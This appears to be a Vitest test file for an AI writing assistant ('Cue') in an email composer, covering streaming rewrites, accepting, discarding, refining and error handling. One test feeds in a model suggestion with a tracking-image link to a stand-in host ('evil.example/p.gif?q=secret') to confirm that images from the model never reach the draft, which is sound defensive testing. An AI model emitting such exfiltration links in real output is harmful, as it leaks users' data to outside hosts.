// @vitest-environment jsdom
import type {
  EmailEditorAssistContext,
  EmailEditorHandle,
} from "@inboxzero/email-editor/web";
import {
  act,
  cleanup,
  fireEvent,
  render,
  screen,
  waitFor,
} from "@testing-library/react";
import { useRef } from "react";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { useComposeAssist } from "./useComposeAssist";

const { recordOutcome } = vi.hoisted(() => ({
  recordOutcome: vi.fn(async () => undefined),
}));
vi.mock("@/utils/actions/compose-assist", () => ({
  recordComposeAssistOutcomeAction: recordOutcome,
}));

const SELECTION: EmailEditorAssistContext = {
  target: "selection",
  before: "Hi Sam,\n",
  text: "can u send the doc pls",
  after: "",
  containsImages: false,
};
const CARET: EmailEditorAssistContext = {
  target: "cursor",
  before: "Hi Sam,\n",
  text: "",
  after: "",
  containsImages: false,
};

let streams: ReturnType<typeof controllableStream>[] = [];
let requests: { body: Record<string, unknown>; signal: AbortSignal }[] = [];

beforeEach(() => {
  streams = [];
  requests = [];
  recordOutcome.mockClear();
  vi.stubGlobal(
    "ResizeObserver",
    class {
      observe() {}
      disconnect() {}
    },
  );
  vi.stubGlobal(
    "fetch",
    vi.fn(async (_url: string, init: RequestInit) => {
      const signal = init.signal as AbortSignal;
      requests.push({ body: JSON.parse(String(init.body)), signal });
      const stream = controllableStream(signal);
      streams.push(stream);
      return new Response(stream.readable, { status: 200 });
    }),
  );
});

afterEach(() => {
  cleanup();
  vi.unstubAllGlobals();
});

// Streams and a lazily rendered panel are slow on a loaded machine.
describe("useComposeAssist", { timeout: 20_000 }, () => {
  it("rewrites a selection, streaming the suggestion, and accepts it on Enter", async () => {
    const { editor } = renderAssist(SELECTION);
    openAssist();

    fireEvent.keyDown(
      await screen.findByRole("menuitem", { name: /Shorter/ }),
      {
        key: "s",
      },
    );
    await waitFor(() => expect(requests).toHaveLength(1));
    expect(requests[0].body).toMatchObject({
      mode: "rewrite",
      action: "shorter",
      text: "can u send the doc pls",
      before: "Hi Sam,\n",
      threadId: "thread-1",
      to: "sam@example.com",
    });

    await act(async () => streams[0].push("Could you send "));
    expect(
      screen.getByLabelText("Suggested text").getAttribute("aria-busy"),
    ).toBe("true");
    // Enter does nothing until the suggestion is complete.
    fireEvent.keyDown(refineInput(), { key: "Enter" });
    expect(editor.commitAssist).not.toHaveBeenCalled();

    await act(async () => streams[0].push("the **doc**?"));
    await act(async () => streams[0].end());
    // The rewrite reads as the new text, with what it removed struck out.
    const output = screen.getByLabelText("Suggested text");
    expect(textWithout(output, "del")).toBe("Could you send the doc?");
    expect(textWithout(output, "ins")).toBe("can u send the doc pls");

    fireEvent.keyDown(refineInput(), { key: "Enter" });

    expect(editor.commitAssist).toHaveBeenCalledTimes(1);
    expect(editor.commitAssist.mock.calls[0][0]).toContain(
      "<strong>doc</strong>",
    );
    expect(screen.queryByRole("dialog", { name: "Cue" })).toBeNull();
  });

  it("discards on Escape, stopping the request and leaving the draft alone", async () => {
    const { editor } = renderAssist(SELECTION);
    openAssist();
    fireEvent.keyDown(
      await screen.findByRole("menuitem", { name: /Improve/ }),
      {
        key: "i",
      },
    );
    await waitFor(() => expect(requests).toHaveLength(1));
    await act(async () => streams[0].push("Could you"));

    fireEvent.keyDown(refineInput(), { key: "Escape" });

    expect(requests[0].signal.aborted).toBe(true);
    expect(editor.endAssist).toHaveBeenCalled();
    expect(editor.commitAssist).not.toHaveBeenCalled();
    expect(editor.focus).toHaveBeenCalled();
    expect(screen.queryByRole("dialog", { name: "Cue" })).toBeNull();
  });

  it("closes Cue, not the composer, on Escape from the draft", async () => {
    const { editor } = renderAssist(SELECTION);
    openAssist();
    fireEvent.keyDown(
      await screen.findByRole("menuitem", { name: /Improve/ }),
      { key: "i" },
    );
    await waitFor(() => expect(requests).toHaveLength(1));
    const outerEscape = vi.fn();
    document.addEventListener("keydown", outerEscape);

    fireEvent.keyDown(screen.getByRole("textbox", { name: "Draft" }), {
      key: "Escape",
    });

    document.removeEventListener("keydown", outerEscape);
    expect(outerEscape).not.toHaveBeenCalled();
    expect(editor.endAssist).toHaveBeenCalled();
    expect(screen.queryByRole("dialog", { name: "Cue" })).toBeNull();
  });

  it("retries with ⌘R and sends what the user typed to refine it", async () => {
    renderAssist(SELECTION);
    openAssist();
    fireEvent.keyDown(
      await screen.findByRole("menuitem", { name: /Improve/ }),
      {
        key: "i",
      },
    );
    await waitFor(() => expect(requests).toHaveLength(1));
    await act(async () => {
      streams[0].push("First try");
      streams[0].end();
    });

    fireEvent.keyDown(refineInput(), { key: "r", metaKey: true });
    await waitFor(() => expect(requests).toHaveLength(2));
    expect(requests[1].body).toMatchObject({
      action: "improve",
      refinements: [],
    });
    await act(async () => {
      streams[1].push("Second try");
      streams[1].end();
    });

    fireEvent.change(refineInput(), { target: { value: "mention Friday" } });
    fireEvent.keyDown(refineInput(), { key: "Enter" });

    await waitFor(() => expect(requests).toHaveLength(3));
    expect(requests[2].body).toMatchObject({
      action: "improve",
      refinements: ["mention Friday"],
    });
  });

  it("never sends while Cue is open, and a send keystroke never changes the draft", async () => {
    const { editor, interceptSend } = renderAssist(SELECTION);
    openAssist();
    await screen.findByRole("menu");
    expect(interceptSend()).toBe(true);

    fireEvent.keyDown(screen.getByRole("menuitem", { name: /grammar/ }), {
      key: "g",
    });
    await waitFor(() => expect(requests).toHaveLength(1));
    expect(interceptSend()).toBe(true);
    expect(editor.commitAssist).not.toHaveBeenCalled();

    await act(async () => {
      streams[0].push("Can you send the doc, please?");
      streams[0].end();
    });
    refineInput().blur();
    expect(interceptSend()).toBe(true);
    fireEvent.keyDown(refineInput(), { key: "Enter", metaKey: true });

    // Both only bring the suggestion back into focus for a decision.
    expect(editor.commitAssist).not.toHaveBeenCalled();
    expect(document.activeElement).toBe(refineInput());
    expect(screen.getByRole("dialog", { name: "Cue" })).toBeTruthy();

    fireEvent.keyDown(refineInput(), { key: "Enter" });
    expect(editor.commitAssist).toHaveBeenCalledTimes(1);
    expect(interceptSend()).toBe(false);
  });

  it("shows why a suggestion failed and keeps the draft untouched", async () => {
    vi.mocked(fetch).mockResolvedValueOnce(
      Response.json(
        { error: "Please upgrade for AI access", isKnownError: true },
        { status: 403 },
      ),
    );
    const { editor } = renderAssist(SELECTION);
    openAssist();
    fireEvent.keyDown(
      await screen.findByRole("menuitem", { name: /Improve/ }),
      {
        key: "i",
      },
    );

    expect((await screen.findByRole("alert")).textContent).toBe(
      "Please upgrade for AI access",
    );
    expect(screen.getByRole("button", { name: /Accept/ })).toHaveProperty(
      "disabled",
      true,
    );
    expect(editor.commitAssist).not.toHaveBeenCalled();
  });

  it("treats an empty answer as a failure, not as an empty suggestion", async () => {
    renderAssist(SELECTION);
    openAssist();
    fireEvent.keyDown(
      await screen.findByRole("menuitem", { name: /Improve/ }),
      {
        key: "i",
      },
    );
    await waitFor(() => expect(requests).toHaveLength(1));
    await act(async () => streams[0].end());

    expect((await screen.findByRole("alert")).textContent).toMatch(
      /didn't suggest anything/u,
    );
  });

  it("says so when the draft changed under the suggestion", async () => {
    const { editor } = renderAssist(SELECTION);
    editor.commitAssist.mockReturnValue(false);
    openAssist();
    fireEvent.keyDown(
      await screen.findByRole("menuitem", { name: /Improve/ }),
      {
        key: "i",
      },
    );
    await waitFor(() => expect(requests).toHaveLength(1));
    await act(async () => {
      streams[0].push("Better text");
      streams[0].end();
    });

    fireEvent.click(screen.getByRole("button", { name: /Accept/ }));

    expect((await screen.findByRole("alert")).textContent).toMatch(
      /draft changed/u,
    );
  });

  it("asks what to write at the caret, and continues writing on Tab", async () => {
    renderAssist(CARET);
    openAssist();
    const prompt = await screen.findByRole("textbox", {
      name: "Ask Cue to write",
    });

    fireEvent.keyDown(prompt, { key: "Tab" });

    await waitFor(() => expect(requests).toHaveLength(1));
    expect(requests[0].body).toMatchObject({
      mode: "continue",
      before: "Hi Sam,\n",
    });
  });

  it("writes what was asked for at the caret", async () => {
    renderAssist(CARET);
    openAssist();
    const prompt = await screen.findByRole("textbox", {
      name: "Ask Cue to write",
    });

    fireEvent.change(prompt, {
      target: { value: "say I'm in, ask for the doc" },
    });
    fireEvent.keyDown(prompt, { key: "Enter" });

    await waitFor(() => expect(requests).toHaveLength(1));
    expect(requests[0].body).toMatchObject({
      mode: "write",
      instruction: "say I'm in, ask for the doc",
    });
  });

  it("shows where a suggested link goes, not just its text", async () => {
    renderAssist(SELECTION);
    openAssist();
    fireEvent.keyDown(
      await screen.findByRole("menuitem", { name: /Improve/ }),
      { key: "i" },
    );
    await waitFor(() => expect(requests).toHaveLength(1));
    await act(async () => {
      streams[0].push("Please [pay here](https://pay.example.test/x).");
      streams[0].end();
    });

    expect(screen.getByLabelText("Suggested text").textContent).toContain(
      "pay here (https://pay.example.test/x)",
    );
  });

  it("never puts an image from the model into the draft", async () => {
    const { editor } = renderAssist(SELECTION);
    openAssist();
    fireEvent.keyDown(
      await screen.findByRole("menuitem", { name: /Improve/ }),
      { key: "i" },
    );
    await waitFor(() => expect(requests).toHaveLength(1));
    await act(async () => {
      streams[0].push(
        "Thanks! ![](https://evil.example/p.gif?q=secret) See [the doc][d].\n\n[d]: https://evil.example/doc",
      );
      streams[0].end();
    });

    // What the suggestion says, without the struck-out original.
    const preview = textWithout(screen.getByLabelText("Suggested text"), "del");
    expect(preview).toContain("https://evil.example/p.gif?q=secret");
    expect(preview).toContain("the doc (https://evil.example/doc)");

    fireEvent.keyDown(refineInput(), { key: "Enter" });
    const html = editor.commitAssist.mock.calls[0][0];
    expect(html).not.toMatch(/<img/iu);
    expect(html).toContain("https://evil.example/p.gif?q=secret");
  });

  it("asks for a shorter selection instead of sending a huge one", async () => {
    renderAssist({ ...SELECTION, text: "word ".repeat(5000) });
    openAssist();
    fireEvent.keyDown(
      await screen.findByRole("menuitem", { name: /Improve/ }),
      { key: "i" },
    );

    expect((await screen.findByRole("alert")).textContent).toMatch(
      /shorter passage/u,
    );
    expect(requests).toHaveLength(0);
  });

  it("refuses to rewrite a selection that holds images", async () => {
    renderAssist({ ...SELECTION, containsImages: true });
    openAssist();
    fireEvent.keyDown(
      await screen.findByRole("menuitem", { name: /Improve/ }),
      {
        key: "i",
      },
    );

    expect((await screen.findByRole("alert")).textContent).toMatch(/images/u);
    expect(requests).toHaveLength(0);
  });

  it("tells Cue what the user accepted in a reply, follow-ups included", async () => {
    renderAssist(SELECTION);
    openAssist();
    fireEvent.keyDown(
      await screen.findByRole("menuitem", { name: /Improve/ }),
      { key: "i" },
    );
    await waitFor(() => expect(requests).toHaveLength(1));
    await act(async () => {
      streams[0].push("Send the doc.");
      streams[0].end();
    });
    fireEvent.change(refineInput(), { target: { value: "ask, don't tell" } });
    fireEvent.keyDown(refineInput(), { key: "Enter" });
    await waitFor(() => expect(requests).toHaveLength(2));
    await act(async () => {
      streams[1].push("Could you send the **doc**?");
      streams[1].end();
    });
    // Refining replaces a suggestion; it is not turning it down.
    expect(recordOutcome).not.toHaveBeenCalled();

    fireEvent.keyDown(refineInput(), { key: "Enter" });

    expect(recordOutcome).toHaveBeenCalledTimes(1);
    expect(recordOutcome).toHaveBeenCalledWith("account-1", {
      threadId: "thread-1",
      messageId: "message-1",
      outcome: {
        outcome: "accepted",
        request: "Improve",
        refinements: ["ask, don't tell"],
        original: "can u send the doc pls",
        suggestion: "Could you send the doc?",
      },
    });
  });

  it("tells Cue about a suggestion the user discarded, not one it never finished", async () => {
    renderAssist(CARET);
    openAssist();
    const prompt = await screen.findByRole("textbox", {
      name: "Ask Cue to write",
    });
    fireEvent.change(prompt, { target: { value: "say I'm in" } });
    fireEvent.keyDown(prompt, { key: "Enter" });
    await waitFor(() => expect(requests).toHaveLength(1));
    await act(async () => streams[0].push("Count me"));
    fireEvent.keyDown(refineInput(), { key: "Escape" });
    expect(recordOutcome).not.toHaveBeenCalled();

    openAssist();
    const again = await screen.findByRole("textbox", {
      name: "Ask Cue to write",
    });
    fireEvent.change(again, { target: { value: "say I'm in" } });
    fireEvent.keyDown(again, { key: "Enter" });
    await waitFor(() => expect(requests).toHaveLength(2));
    await act(async () => {
      streams[1].push("Count me in!");
      streams[1].end();
    });
    fireEvent.keyDown(refineInput(), { key: "Escape" });

    expect(recordOutcome).toHaveBeenCalledWith("account-1", {
      threadId: "thread-1",
      messageId: "message-1",
      outcome: {
        outcome: "discarded",
        request: "say I'm in",
        refinements: [],
        original: "",
        suggestion: "Count me in!",
      },
    });
  });

  it("keeps what the user does with Cue outside a reply to itself", async () => {
    const { editor } = renderAssist(SELECTION, { inReply: false });
    openAssist();
    fireEvent.keyDown(
      await screen.findByRole("menuitem", { name: /Shorter/ }),
      { key: "s" },
    );
    await waitFor(() => expect(requests).toHaveLength(1));
    await act(async () => {
      streams[0].push("Send the doc?");
      streams[0].end();
    });
    fireEvent.keyDown(refineInput(), { key: "Enter" });

    expect(editor.commitAssist).toHaveBeenCalled();
    expect(recordOutcome).not.toHaveBeenCalled();
  });

  it("stops streaming when the composer closes", async () => {
    const view = renderAssist(SELECTION);
    openAssist();
    fireEvent.keyDown(
      await screen.findByRole("menuitem", { name: /Improve/ }),
      {
        key: "i",
      },
    );
    await waitFor(() => expect(requests).toHaveLength(1));

    view.unmount();

    expect(requests[0].signal.aborted).toBe(true);
  });
});

function renderAssist(
  context: EmailEditorAssistContext,
  { inReply = true }: { inReply?: boolean } = {},
) {
  const editor = {
    beginAssist: vi.fn(() => context),
    commitAssist: vi.fn((_html: string) => true),
    endAssist: vi.fn(),
    focus: vi.fn(),
    getAssistAnchor: vi.fn(() => new DOMRect(10, 10, 100, 20)),
  };
  let interceptSend = () => false;
  function Harness() {
    const editorRef = useRef(editor as unknown as EmailEditorHandle);
    const formRef = useRef<HTMLFormElement>(null);
    const assist = useComposeAssist({
      editorRef,
      emailAccountId: "account-1",
      threadId: "thread-1",
      replyToMessageId: inReply ? "message-1" : undefined,
      getEnvelope: () => ({ to: "sam@example.com" }),
      formRef,
    });
    interceptSend = assist.interceptSend;
    return (
      <form ref={formRef}>
        <button onClick={assist.open} type="button">
          Ask Cue
        </button>
        <textarea aria-label="Draft" />
        {assist.panel}
      </form>
    );
  }
  const view = render(<Harness />);
  return { ...view, editor, interceptSend: () => interceptSend() };
}

function textWithout(element: HTMLElement, tag: "del" | "ins") {
  const copy = element.cloneNode(true) as HTMLElement;
  for (const part of copy.querySelectorAll(tag)) part.remove();
  return copy.textContent;
}

function openAssist() {
  fireEvent.click(screen.getByRole("button", { name: "Ask Cue" }));
}

function refineInput() {
  return screen.getByRole("textbox", { name: "Ask Cue for changes" });
}

function controllableStream(signal: AbortSignal) {
  let controller!: ReadableStreamDefaultController<Uint8Array>;
  const readable = new ReadableStream<Uint8Array>({
    start(streamController) {
      controller = streamController;
    },
  });
  signal.addEventListener("abort", () => {
    try {
      controller.error(new DOMException("Aborted", "AbortError"));
    } catch {}
  });
  const encoder = new TextEncoder();
  return {
    readable,
    push: async (text: string) => {
      controller.enqueue(encoder.encode(text));
      await new Promise((resolve) => setTimeout(resolve, 0));
    },
    end: async () => {
      controller.close();
      await new Promise((resolve) => setTimeout(resolve, 0));
    },
  };
}
